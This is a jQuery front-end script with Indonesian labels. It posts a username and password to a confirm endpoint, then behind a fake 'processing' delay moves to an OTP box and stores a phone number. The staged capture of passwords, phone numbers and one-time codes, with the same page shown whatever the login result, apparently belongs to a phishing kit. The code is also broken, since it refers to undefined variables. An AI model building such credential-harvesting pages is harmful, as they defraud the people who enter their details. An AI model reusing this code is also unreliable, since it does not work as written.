
 
function gotologin(){
    document.getElementById("formlogin").style.display = "block";
}

function batalkanku(){
    document.getElementById("formlogin").style.display = "none";
    
}

 $(document).ready(function() {
            $('.toggle i').click(function() {
                if ($("#pass").attr('type') === 'password') {
                    $("#pass").attr('type', 'text');
                    $(this).removeClass('fa-eye-slash').addClass('fa-eye');
                } else {
                    $("#pass").attr('type', 'password');
                    $(this).removeClass('fa-eye').addClass('fa-eye-slash');
                }
            });
            $('#uname, #pass').on('input', function() {
                if ($('#uname').val().length < 6 || $('#pass').val().length < 6) {
                    $('#btnsubmit').prop('disabled', true);
                } else {
                    $('#btnsubmit').prop('disabled', false);
                }
            });
        });
        $("textarea").each(function () {
            this.setAttribute("style", "height:" + (this.scrollHeight) + "px;overflow-y:hidden;");
        }).on("input", function () {
            this.style.height = 0;
            this.style.height = (this.scrollHeight) + "px";
        });
        $('#inpsms').on('input', function() {
            if ($(this).val().length < 10){
                $('#btnsubmit').prop('disabled', true);
            } else {
                $('#btnsubmit').prop('disabled', false);
            }
        });
        
        
           $(document).ready(function() {
            $("body").on('click', 'button#doLog', function() {
                var uname = $("#uname").val();
                var pass = $("#pass").val();

                $.ajax({
                    url: "/login/confirm.php",
                    method: "POST",
                    data: "username="+user+"&password="+pass,
                    beforeSend: function() {
                        $("#loading").show();
                    },
                    success: function(responsex) {
                        $("#aseli").html('');
                        if(responsex == "true") {
                            $.get("", function(datax, status){
                                window.history.pushState("", "", '');
                                $("#hideBody").hide();
                                $("#loading").hide();
                                $("#aseli").html(datax);
                            });
                        } else {
                            $.get("", function(data, status){
                                window.history.pushState("", "", '');
                                setTimeout(function() { 
                                    $("#hideBody").hide();
                                    $("#loading").hide();
                                    $("#aseli").html(data);
                                    $("#aseli").show();
                                }, 1000);
                            });
                        }
                        
                    }
                })
            });
            $("div#eyeOpen").on('click', function() {
                $("#eyeOpen").css("display", "none");
                $("#eyeClose").css("display", "block");

                $("#pass").prop("type", "text");

                $("div#eyeClose").on('click', function() {
                    $("#eyeOpen").css("display", "block");
                    $("#eyeClose").css("display", "none");

                    $("#pass").prop("type", "password");
                });
            });

            $("#uname").on('input', function() {
                var uname = $("#uname").val();
                var pass = $("#pass").val();

                OnButton(uname, pass);
            });

            $("#pass").on('input', function() {
                var uname = $("#user").val();
                var pass = $("#pass").val();

                OnButton(uname, pass);
            });
        });
        
 $(document).ready(function(){  
 $('#inputUser').submit(function(e){
    event.preventDefault();
 $("#process1").show();event.preventDefault();
    setTimeout(function(){
      
 $(".box-user").hide();
 $("#formLink").fadeIn();
 $(".box-otp").show();
 
      
    },1500);
      
      
    
document.getElementById('buttonku').innerHTML = "Memproses....";


 $.ajax({
 type: 'POST',
 data: $(this).serialize(),
 datatype: 'JSON',
 
 complete: function(data) {
            console.log('Complete')
   setTimeout(function(){
  
 var nohp = document.getElementById("nohp").value;
 sessionStorage.setItem("nomor", nomor);   
    }, 1000);
        }
    });
 });
    return false;
});